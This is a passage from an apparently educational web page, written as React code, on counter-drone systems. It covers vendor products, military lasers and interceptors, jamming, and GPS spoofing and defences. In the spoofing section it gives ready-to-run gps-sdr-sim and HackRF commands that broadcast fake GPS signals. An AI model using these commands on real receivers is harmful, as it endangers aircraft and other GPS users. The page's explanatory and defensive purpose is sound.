│ └── Integrated with Lattice for auto-launch                 │
│                                                             │
│ Specifications:                                             │
│ ├── Speed: 100+ mph intercept                               │
│ ├── Endurance: ~20 minutes                                  │
│ ├── Target acquisition: Onboard AI vision                   │
│ └── Cost: Fraction of missile-based systems                 │
└─────────────────────────────────────────────────────────────┘

PULSAR™ Electronic Warfare:
├── Directional jamming capability
├── GPS denial systems
├── Integrated with Lattice for automated response
└── Classified advanced EW capabilities

Deployments:
├── US Border Protection (CBP)
├── US Marine Corps
├── UK Royal Marines
├── US Special Operations Command
└── Multiple allied nations`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        D-Fend Solutions (Israel)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        D-Fend specializes in cyber-takeover technology—actually hijacking rogue drones rather than 
                        jamming them, allowing for controlled landing and forensic recovery.
                      </Typography>
                      <CodeBlock
                        code={`D-Fend EnforceAir™ System
════════════════════════════════════════════════════════════

CYBER-TAKEOVER TECHNOLOGY:
┌─────────────────────────────────────────────────────────────┐
│ How It Works:                                               │
│ ├── 1. Passive detection of drone RF signals                │
│ ├── 2. Protocol identification and analysis                 │
│ ├── 3. Cyber-takeover of control link                       │
│ ├── 4. Operator control of hostile drone                    │
│ └── 5. Safe landing at designated location                  │
│                                                             │
│ Advantages over Jamming:                                    │
│ ├── Controlled outcome (no random crash)                    │
│ ├── Forensic recovery of drone intact                       │
│ ├── Evidence preservation for prosecution                   │
│ ├── Minimal collateral RF interference                      │
│ └── Works in sensitive RF environments                      │
│                                                             │
│ Limitations:                                                │
│ ├── Requires knowledge of target protocol                   │
│ ├── May not work against encrypted links                    │
│ ├── Autonomous drones harder to interdict                   │
│ └── Rapidly evolving drone protocols                        │
└─────────────────────────────────────────────────────────────┘

EnforceAir2™ Specifications:
├── Detection range: 3.5 km+
├── Mitigation range: 1.5 km+
├── Simultaneous threats: Multiple
├── Supported protocols: DJI, Parrot, custom FPV, others
├── Form factors: Fixed, vehicle-mounted, portable
└── Integration: Full API for C2 systems

Use Cases:
├── Prison security (contraband prevention)
├── VIP protection
├── Event security
├── Critical infrastructure
└── Airport protection

Notable Deployments:
├── FAA testing programs (USA)
├── Multiple European airports
├── G20 Summit security
└── Various government installations`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Commercial C-UAS Comparison Matrix
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <TableContainer component={Paper} sx={{ bgcolor: theme.bgCode }}>
                        <Table size="small">
                          <TableHead>
                            <TableRow>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Vendor</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Detection</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Defeat Method</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Unique Feature</TableCell>
                              <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Price Range</TableCell>
                            </TableRow>
                          </TableHead>
                          <TableBody>
                            {[
                              { vendor: "DroneShield", detect: "RF, Radar, Acoustic", defeat: "RF Jamming", unique: "Handheld DroneGun", price: "$$-$$$$" },
                              { vendor: "Dedrone", detect: "RF, Radar, Video", defeat: "Smart Jamming", unique: "AI Classification", price: "$$$-$$$$" },
                              { vendor: "Anduril", detect: "AESA Radar, AI Vision", defeat: "Kinetic (Anvil)", unique: "Lattice AI Platform", price: "$$$$" },
                              { vendor: "D-Fend", detect: "RF Analysis", defeat: "Cyber-Takeover", unique: "Controlled Landing", price: "$$$-$$$$" },
                              { vendor: "Battelle", detect: "RF", defeat: "DroneDefender Gun", unique: "Proven Military Use", price: "$$-$$$" },
                              { vendor: "Fortem", detect: "Radar", defeat: "DroneHunter (Net)", unique: "Drone-launched Net", price: "$$$" },
                              { vendor: "OpenWorks", detect: "RF, Radar", defeat: "SkyWall (Net Gun)", unique: "Shoulder-fired Net", price: "$$" },
                            ].map((row, idx) => (
                              <TableRow key={idx}>
                                <TableCell sx={{ color: theme.secondary, fontWeight: 500 }}>{row.vendor}</TableCell>
                                <TableCell sx={{ color: theme.text }}>{row.detect}</TableCell>
                                <TableCell sx={{ color: theme.accent }}>{row.defeat}</TableCell>
                                <TableCell sx={{ color: theme.textMuted }}>{row.unique}</TableCell>
                                <TableCell sx={{ color: theme.info }}>{row.price}</TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      </TableContainer>
                      <Typography variant="caption" sx={{ color: theme.textMuted, display: "block", mt: 1 }}>
                        Price ranges: $ = Under $50K, $$ = $50K-$250K, $$$ = $250K-$1M, $$$$ = $1M+
                      </Typography>
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Military C-UAS Systems Section */}
              <Box id="military-cuas" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <ShieldIcon /> Military C-UAS Systems
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Military counter-drone systems represent the cutting edge of C-UAS technology, with capabilities 
                    far beyond commercial solutions. Understanding these systems provides insight into both the 
                    maximum achievable performance and the direction of future commercial development.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The evolving threat landscape:</strong> Military C-UAS has taken on urgent importance due 
                    to the proliferation of armed drones and drone swarms in recent conflicts. The Ukraine war has 
                    demonstrated how even small, commercial-derived drones can be devastating on the modern battlefield. 
                    This has driven massive investment in layered defense systems capable of handling threats from 
                    small quadcopters to cruise missiles.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Layered defense concept:</strong> Modern military C-UAS follows a layered approach: 
                    long-range detection (radar), mid-range interdiction (missiles/directed energy), and close-range 
                    point defense (guns/electronic warfare). Different threats require different responses—you don't 
                    want to use a $100,000 missile against a $500 drone, but you also need the capability to engage 
                    faster, more dangerous threats.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Directed Energy Systems (Lasers & HPM)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="info" sx={{ mb: 2, bgcolor: alpha(theme.info, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          Directed energy weapons offer potentially unlimited "magazines" at very low cost-per-shot, 
                          making them ideal for countering cheap drone swarms.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`Military Directed Energy C-UAS Systems
════════════════════════════════════════════════════════════

HIGH-ENERGY LASER (HEL) SYSTEMS:

Raytheon HELWS (High Energy Laser Weapon System):
┌─────────────────────────────────────────────────────────────┐
│ ├── Power: 10-50 kW class                                   │
│ ├── Platform: Ground-based, vehicle-mounted                 │
│ ├── Target: Small UAS, mortars, rockets                     │
│ ├── Engagement time: 2-5 seconds to disable                 │
│ ├── Range: Several km                                       │
│ ├── Cost per shot: ~$1-10 (electricity)                     │
│ └── Deployed: Middle East, tested extensively               │
└─────────────────────────────────────────────────────────────┘

Lockheed Martin HELIOS:
┌─────────────────────────────────────────────────────────────┐
│ ├── Power: 60+ kW                                           │
│ ├── Platform: US Navy ships (DDG-51 destroyers)             │
│ ├── Capability: C-UAS, anti-surface warfare, ISR dazzle     │
│ ├── Integration: AEGIS combat system                        │
│ └── Status: Initial operational capability achieved         │
└─────────────────────────────────────────────────────────────┘

IRON BEAM (Israel):
┌─────────────────────────────────────────────────────────────┐
│ ├── Developer: Rafael Advanced Defense Systems              │
│ ├── Power: 100 kW class                                     │
│ ├── Integration: Iron Dome air defense                      │
│ ├── Target: Drones, rockets, mortars                        │
│ ├── Range: Up to 7 km                                       │
│ └── Status: Deployed operationally 2024                     │
└─────────────────────────────────────────────────────────────┘

HIGH-POWER MICROWAVE (HPM) SYSTEMS:

Raytheon PHASER:
┌─────────────────────────────────────────────────────────────┐
│ ├── Technology: High-power microwave                        │
│ ├── Effect: Fries drone electronics instantly               │
│ ├── Advantage: Wide beam, can engage swarms                 │
│ ├── Range: Hundreds of meters to km                         │
│ ├── Platform: Container-based, vehicle-mounted              │
│ └── Multiple drones neutralized simultaneously              │
└─────────────────────────────────────────────────────────────┘

Epirus Leonidas:
┌─────────────────────────────────────────────────────────────┐
│ ├── Technology: Solid-state HPM                             │
│ ├── Capability: Counter-swarm optimized                     │
│ ├── Engagement: Dozens of drones per pulse                  │
│ ├── Form factors: Vehicle, fixed, dismounted                │
│ ├── Power: GaN-based, software-defined                      │
│ └── Status: US Army selected, operational deployment        │
└─────────────────────────────────────────────────────────────┘

Directed Energy Advantages:
├── Near-unlimited magazine (limited by power supply)
├── Cost per engagement: <$10 vs $100K+ for missiles
├── Speed of light engagement (no lead calculation)
├── Scalable power (disable vs destroy)
├── No explosive ordnance concerns
└── Effective against drone swarms`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Kinetic Interceptors
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Military Kinetic C-UAS Systems
════════════════════════════════════════════════════════════

MISSILE/INTERCEPTOR SYSTEMS:

Raytheon Coyote Block 3:
┌─────────────────────────────────────────────────────────────┐
│ ├── Type: Expendable interceptor drone                      │
│ ├── Guidance: RF seeker + visual                            │
│ ├── Speed: 80+ knots                                        │
│ ├── Kill mechanism: Proximity warhead or kinetic            │
│ ├── Cost: ~$80,000 per unit                                 │
│ ├── Launcher: Multi-round ground-based                      │
│ └── Integration: Ku-band CUAS system                        │
└─────────────────────────────────────────────────────────────┘

AIM-9X Sidewinder (adapted):
┌─────────────────────────────────────────────────────────────┐
│ ├── Original purpose: Air-to-air missile                    │
│ ├── Adaptation: Surface-launched C-UAS                      │
│ ├── Seeker: Imaging infrared                                │
│ ├── Engagement: Larger, faster UAS                          │
│ ├── Cost: ~$400,000 (overkill for small drones)             │
│ └── Example: Shot down Chinese spy balloon 2023             │
└─────────────────────────────────────────────────────────────┘

GUN-BASED SYSTEMS:

Rheinmetall Skynex:
┌─────────────────────────────────────────────────────────────┐
│ ├── Weapon: 35mm revolver cannon (1000 rpm)                 │
│ ├── Ammunition: AHEAD (airburst) rounds                     │
│ ├── Radar: X-band tracking/fire control                     │
│ ├── Engagement range: 4+ km                                 │
│ ├── Target types: UAS, RAM, cruise missiles                 │
│ └── AHEAD creates cloud of 152 tungsten projectiles         │
└─────────────────────────────────────────────────────────────┘

Phalanx CIWS (C-UAS role):
┌─────────────────────────────────────────────────────────────┐
│ ├── Weapon: 20mm M61A1 Gatling (4500 rpm)                   │
│ ├── Original purpose: Anti-ship missile defense             │
│ ├── C-UAS adaptation: Land-based C-RAM                      │
│ ├── Radar: Ku-band, auto-tracking                           │
│ ├── Engagement: Autonomous or manual                        │
│ └── Used for base defense in Iraq/Afghanistan               │
└─────────────────────────────────────────────────────────────┘

Rafael DRONE DOME:
┌─────────────────────────────────────────────────────────────┐
│ ├── Detection: 3D radar + EO/IR                             │
│ ├── Soft kill: RF jamming, GPS denial                       │
│ ├── Hard kill: Laser (optional)                             │
│ ├── Range: Up to 3.5 km detection, 2 km laser               │
│ ├── Deployment: Fixed or mobile                             │
│ └── Combat proven in Israel                                 │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Electronic Warfare Systems
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Military Electronic Warfare C-UAS
════════════════════════════════════════════════════════════

MAJOR SYSTEMS:

L3Harris VAMPIRE:
┌─────────────────────────────────────────────────────────────┐
│ ├── Type: Vehicle-Agnostic Modular Palletized ISR Rocket    │
│ ├── Capability: Launches guided rockets from any vehicle    │
│ ├── Guidance: Laser-guided munitions                        │
│ ├── Integration: Can mount on pickup trucks                 │
│ ├── Ukraine deployment: Successful C-UAS operations         │
│ └── Low-cost solution for asymmetric warfare                │
└─────────────────────────────────────────────────────────────┘

SRC Silent Archer:
┌─────────────────────────────────────────────────────────────┐
│ ├── Type: Integrated C-UAS system                           │
│ ├── Detection: 3D radar, EO/IR                              │
│ ├── EW: GPS denial, command link jamming                    │
│ ├── Range: Up to 10 km detection                            │
│ ├── Platforms: Fixed, mobile, containerized                 │
│ └── Customers: US DoD, international                        │
└─────────────────────────────────────────────────────────────┘

Russian Krasukha-4:
┌─────────────────────────────────────────────────────────────┐
│ ├── Type: Mobile EW system                                  │
│ ├── Capability: Broadband jamming                           │
│ ├── Target: Airborne radar, satellites, UAS                 │
│ ├── Range: 150-300 km                                       │
│ ├── Ukraine: Used against Ukrainian drones                  │
│ └── Limitation: Can affect friendly systems too             │
└─────────────────────────────────────────────────────────────┘

US Army LIDS (Low, Slow, Small UAS Integrated Defeat System):
┌─────────────────────────────────────────────────────────────┐
│ ├── Integration: Multiple sensors and effectors             │
│ ├── Sensors: Radar, EO/IR, RF detection                     │
│ ├── Effectors: EW, Coyote missiles, guns                    │
│ ├── C2: Integrated command and control                      │
│ ├── Deployment: Forward operating bases                     │
│ └── Philosophy: Layered defense, right effector for threat  │
└─────────────────────────────────────────────────────────────┘

GPS DENIAL SYSTEMS:

┌─────────────────────────────────────────────────────────────┐
│ Purpose: Deny GPS navigation to hostile drones              │
│                                                             │
│ L1 Jamming: 1575.42 MHz (civilian GPS)                      │
│ L2 Jamming: 1227.60 MHz (military GPS, also affects P(Y))   │
│ L5 Jamming: 1176.45 MHz (newer safety-of-life signal)       │
│                                                             │
│ Effect on Drones:                                           │
│ ├── Loss of position hold                                   │
│ ├── Inability to follow waypoints                           │
│ ├── Drift due to IMU errors accumulating                    │
│ ├── Potential geofence triggering                           │
│ └── RTH failure (can't navigate home)                       │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Lessons from Ukraine Conflict
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="warning" sx={{ mb: 2, bgcolor: alpha(theme.warning, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          The Ukraine conflict (2022-present) has become the largest real-world testing ground for 
                          drone and counter-drone technologies, fundamentally changing military thinking about C-UAS.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`Ukraine Conflict C-UAS Lessons
════════════════════════════════════════════════════════════

DRONE THREAT EVOLUTION:
┌─────────────────────────────────────────────────────────────┐
│ Commercial Drones:                                          │
│ ├── DJI Mavic/Phantom: Reconnaissance, artillery spotting   │
│ ├── Modified with munition drops                            │
│ └── Cost: $500-2000 per unit                                │
│                                                             │
│ FPV Kamikaze Drones:                                        │
│ ├── Racing drone airframes + explosive payload              │
│ ├── First-person view for precision strike                  │
│ ├── Cost: ~$400-500 per unit                                │
│ └── Tank kills with $500 drone vs $2M tank                  │
│                                                             │
│ Iranian Shahed-136:                                         │
│ ├── Loitering munition / cruise missile                     │
│ ├── Range: 2500+ km                                         │
│ ├── Payload: ~40 kg warhead                                 │
│ └── Cost: ~$20,000-50,000                                   │
└─────────────────────────────────────────────────────────────┘

EFFECTIVE C-UAS METHODS (Ukraine):
├── Electronic warfare: Most common, most effective
│   └── Jamming GPS and control links
├── Mobile AA guns: ZU-23-2, Gepard
│   └── Visual tracking, high volume fire
├── MANPADS: Stinger, Starstreak (for larger UAS)
├── Small arms: Even rifles effective against slow drones
├── Interceptor drones: Drone-on-drone tactics
└── Improvised: Trained dogs, nets, decoys

LESSONS LEARNED:
┌─────────────────────────────────────────────────────────────┐
│ 1. Scale matters: Thousands of drones, need mass C-UAS      │
│ 2. Cost asymmetry: Can't use $100K missile on $500 drone    │
│ 3. EW effectiveness: Jamming works but drone adapt          │
│ 4. Layered defense: Need multiple methods                   │
│ 5. Mobility: Static C-UAS gets targeted, need mobile        │
│ 6. Training: Operators need extensive training              │
│ 7. Integration: C-UAS must integrate with air defense       │
│ 8. Frequency agility: Drones evolving to counter jamming    │
└─────────────────────────────────────────────────────────────┘

CHALLENGES OBSERVED:
├── Drone saturation attacks overwhelming defenses
├── Ammunition consumption unsustainable
├── Friendly fire from aggressive EW
├── Difficulty distinguishing friend from foe drones
├── Night operations difficult without thermal
└── Supply chain for C-UAS components`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Placeholder for remaining sections - will be added */}
              <Box id="counter-measures" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <BlockIcon /> Counter-Measures
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Methods for neutralizing unauthorized drones range from electronic to kinetic approaches. Understanding 
                    these techniques is essential for both defenders who need to protect sensitive areas and security 
                    researchers assessing drone system resilience.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The counter-drone spectrum:</strong> Counter-measures exist on a spectrum from "soft" to "hard" 
                    kill. Soft-kill methods like jamming or spoofing disable or redirect drones without physical destruction. 
                    Hard-kill methods physically neutralize drones through nets, projectiles, lasers, or even trained birds. 
                    Each approach has trade-offs in terms of effectiveness, collateral damage risk, legality, and cost.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The legal complexity:</strong> In most jurisdictions, using active counter-measures against 
                    drones is highly restricted or outright illegal. Jamming any radio frequency is a federal crime in 
                    the United States (47 U.S.C. § 333), and destroying aircraft—including drones—is also illegal 
                    (18 U.S.C. § 32). Only government entities with specific authorization can legally employ most 
                    active counter-measures. Understanding these legal boundaries is crucial for security professionals.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>For beginners:</strong> Focus first on understanding how each counter-measure works technically 
                    rather than attempting to implement them. Learn the physics of RF jamming, the mathematics of GPS 
                    spoofing, and the engineering of kinetic intercept systems. This knowledge is valuable for threat 
                    assessment and defense planning, even if you never deploy an actual counter-measure.
                  </Typography>

                  <Alert severity="error" sx={{ mb: 3, bgcolor: alpha(theme.error, 0.1), color: theme.text }}>
                    <Typography variant="body2">
                      <strong>Legal Warning:</strong> Jamming, spoofing, and physical interception of drones is illegal
                      in most jurisdictions without proper authorization. These techniques are described for educational purposes.
                    </Typography>
                  </Alert>

                  <Grid container spacing={2} sx={{ mb: 3 }}>
                    {[
                      { title: "RF Jamming", desc: "Disrupts control link, causes failsafe", icon: <SensorsIcon />, color: theme.error },
                      { title: "GPS Spoofing", desc: "Manipulates navigation, redirects drone", icon: <GpsFixedIcon />, color: theme.warning },
                      { title: "Protocol Exploit", desc: "Takes control via protocol vulnerabilities", icon: <BugReportIcon />, color: theme.secondary },
                      { title: "Net Capture", desc: "Physical capture with net guns/drones", icon: <FlightIcon />, color: theme.info },
                      { title: "Laser/HPM", desc: "High-energy weapons (military)", icon: <RadarIcon />, color: theme.accent },
                      { title: "Trained Eagles", desc: "Birds trained to intercept drones", icon: <FlightIcon />, color: theme.success },
                    ].map((item, idx) => (
                      <Grid item xs={12} sm={6} md={4} key={idx}>
                        <Paper sx={{ p: 2, bgcolor: theme.bgNested, height: "100%", borderLeft: `4px solid ${item.color}` }}>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                            <Box sx={{ color: item.color }}>{item.icon}</Box>
                            <Typography variant="subtitle2" sx={{ color: item.color, fontWeight: 600 }}>{item.title}</Typography>
                          </Box>
                          <Typography variant="body2" sx={{ color: theme.textMuted }}>{item.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Jamming Techniques
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`RF Jamming for Counter-Drone
════════════════════════════════════════════════════════════

Target Frequencies:
┌────────────────────────────────────────────────────────────┐
│ 2.4 GHz       │ Control link, WiFi                        │
│ 5.8 GHz       │ Video, some control                       │
│ GPS L1        │ 1575.42 MHz (navigation denial)           │
│ GPS L2        │ 1227.60 MHz (if equipped)                 │
└────────────────────────────────────────────────────────────┘

Jamming Types:
├── Spot jamming: Single frequency, high power
├── Barrage jamming: Wide bandwidth coverage
├── Sweep jamming: Rapidly changing frequency
└── Smart jamming: Protocol-aware, efficient

Typical Jammer Architecture:
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Signal    │───▶│  Amplifier  │───▶│  Antenna    │
│  Generator  │    │  (10-100W)  │    │ (Directional│
└─────────────┘    └─────────────┘    │  or Omni)   │
                                      └─────────────┘

Drone Failsafe Behaviors (when jammed):
├── Return to Home (RTH) - most common
├── Hover in place
├── Descend and land
├── Loss of control (dangerous)
└── Manufacturer dependent

Commercial C-UAS Jammers (Examples):
├── DroneShield DroneGun: Handheld, ~1-2 km range
├── Battelle DroneDefender: Rifle-style, GPS+control
├── Dedrone/RF Jammer solutions: Fixed installation
└── Military: Higher power, integrated systems

Note: Jamming affects all devices on frequency, not just target!`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* GPS Spoofing Section */}
              <Box id="gps-spoofing" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <GpsFixedIcon /> GPS Spoofing
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    GPS spoofing is one of the most sophisticated techniques in the counter-drone arsenal. By transmitting 
                    fake GPS signals that overpower the legitimate satellite signals, an attacker can manipulate where a 
                    drone thinks it is located, potentially redirecting it or triggering fail-safe behaviors.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>How GPS works (and why it's vulnerable):</strong> GPS satellites orbit Earth at about 20,000 km 
                    altitude, broadcasting timing signals on specific frequencies. Your GPS receiver calculates its position 
                    by measuring how long signals take to arrive from multiple satellites. The critical vulnerability is that 
                    civilian GPS signals are unencrypted and very weak by the time they reach Earth (about -130 dBm). This 
                    means any signal on the same frequency that's slightly stronger will be accepted as authentic. Modern 
                    SDR equipment makes it possible to generate convincing fake GPS signals for research purposes.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Spoofing vs. jamming:</strong> While jamming simply blocks GPS signals (causing the drone to 
                    lose navigation), spoofing is more sophisticated—it replaces the real signals with fake ones. A 
                    well-executed spoofing attack can gradually shift a drone's perceived position without triggering 
                    alarms, or it can place the drone inside a geofenced zone to trigger an automatic landing response.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>For security researchers:</strong> GPS spoofing research requires careful attention to legality. 
                    Transmitting on GPS frequencies is illegal in most countries, even at low power. Legitimate research 
                    uses shielded environments, GPS simulators, or software-based simulation. Understanding GPS spoofing 
                    theory helps in developing detection mechanisms and more resilient navigation systems for drones.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        GPS Spoofing Fundamentals
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`GPS Spoofing Attack Overview
════════════════════════════════════════════════════════════

GPS Signal Structure:
┌─────────────────────────────────────────────────────────────┐
│ L1 C/A Signal (Civilian)                                    │
│ Frequency: 1575.42 MHz                                      │
│ Power at ground: ~-130 dBm (very weak!)                     │
│ Modulation: BPSK with C/A code (1.023 Mbps)                 │
│ Data: Navigation message (ephemeris, almanac, time)         │
└─────────────────────────────────────────────────────────────┘

Why Spoofing Works:
├── Civilian GPS has no authentication
├── Signal is extremely weak (-130 dBm)
├── Spoofed signal just needs to be stronger
├── Receiver will lock onto strongest signal
└── No way for receiver to verify authenticity

Spoofing Attack Types:
1. Simplistic (Meaconing)
   └── Record and replay GPS signals with delay

2. Sophisticated
   └── Generate fake GPS signals with desired coordinates

3. Seamless Takeover
   └── Match real signal, then slowly deviate

Spoofing Effects on Drones:
┌─────────────────────────────────────────────────────────────┐
│ • Navigation to wrong coordinates                           │
│ • Triggering geofence (forced landing/RTH)                  │
│ • Hijacking RTH to attacker's location                      │
│ • Altitude errors (dangerous for terrain following)         │
│ • Time manipulation (affects logs, crypto)                  │
└─────────────────────────────────────────────────────────────┘

# GPS spoofing with HackRF (RESEARCH ONLY - ILLEGAL!)
# Using gps-sdr-sim:
./gps-sdr-sim -e brdc.nav -l 40.7128,-74.0060,100 -b 8 -o gpssim.bin
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 40`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        GPS Spoofing Defenses
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Grid container spacing={2}>
                        {[
                          { defense: "Multi-constellation", desc: "Use GPS+GLONASS+Galileo - harder to spoof all" },
                          { defense: "IMU Cross-check", desc: "Compare GPS with inertial sensors for anomalies" },
                          { defense: "Signal Authentication", desc: "Galileo OSNMA provides authenticated signals" },
                          { defense: "Antenna Arrays", desc: "Null steering to reject spoofed signals" },
                          { defense: "Signal Strength", desc: "Detect unusually strong GPS signals" },
                          { defense: "Time Cross-check", desc: "Compare GPS time with other sources" },
                        ].map((item, idx) => (
                          <Grid item xs={12} sm={6} key={idx}>
                            <Paper sx={{ p: 2, bgcolor: theme.bgCode }}>
                              <Typography variant="subtitle2" sx={{ color: theme.success }}>{item.defense}</Typography>
                              <Typography variant="caption" sx={{ color: theme.textMuted }}>{item.desc}</Typography>
                            </Paper>
                          </Grid>
                        ))}
                      </Grid>
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* RF Attacks Section */}
              <Box id="rf-attacks" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <SensorsIcon /> RF Attacks
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Radio frequency attacks target the communication links between drones and their operators. These attacks 
                    exploit the fundamental requirement that most drones need a wireless connection to receive commands and 
                    transmit video or telemetry back to the pilot.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Understanding the attack surface:</strong> Drones typically operate on 2.4 GHz for control and 
                    5.8 GHz for video transmission—the same frequencies used by WiFi. This creates opportunities for 
                    attackers with commodity equipment to analyze, intercept, or disrupt drone communications. The attack 
                    surface includes the modulation scheme used, the protocol structure, any encryption or authentication 
                    mechanisms, and the physical characteristics of the radio link itself.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Signal analysis basics:</strong> Before you can attack a radio system, you need to understand 
                    what's being transmitted. This starts with capturing the signal using a software-defined radio (SDR), 
                    then analyzing its characteristics: What frequency band? What bandwidth? What modulation scheme? Does 
                    it frequency-hop? Is the data encrypted? Tools like GNU Radio, inspectrum, and Universal Radio Hacker 
                    help researchers visualize and decode these signals.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Getting started with RF analysis:</strong> Begin by learning to identify different signal types 
                    in a waterfall display. Practice with known signals like WiFi, Bluetooth, and your own drone's 
                    transmissions. Learn to distinguish between narrow-band control links and wide-band video or FHSS 
                    (frequency-hopping spread spectrum) signals. This foundational knowledge is essential before moving 
                    to more advanced exploitation techniques.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
